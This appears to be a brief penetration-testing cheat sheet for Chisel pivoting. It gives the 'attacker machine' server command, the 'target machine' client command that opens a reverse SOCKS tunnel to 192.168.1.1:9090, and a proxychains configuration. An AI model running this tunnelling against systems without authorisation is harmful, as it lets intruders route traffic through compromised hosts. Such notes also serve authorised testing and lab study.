# chisel setup

## On the Attacker Machine

Start the Chisel server in reverse mode with SOCKS5 support:

```bash
./chisel server -p 9090 --reverse --socks5
```

## On the Target Machine

Connect the target to the attacker’s Chisel server:

```bash
.\chisel.exe client 192.168.1.1:9090 R:socks
```

## Configure Proxychains

Update the content of `/etc/proxychains4.conf` as follows:

```conf
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5  127.0.0.1 1080
